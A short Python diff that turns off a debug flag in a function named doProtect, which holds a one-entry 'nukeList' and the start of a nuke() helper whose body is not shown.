@@ -1,6 +1,6 @@
 def doProtect():
 	import sys,imp,os,os.path,threading
-	debug = True
+	debug = False
 	nukeList = ["Pwnna"]
 
 	def nuke():
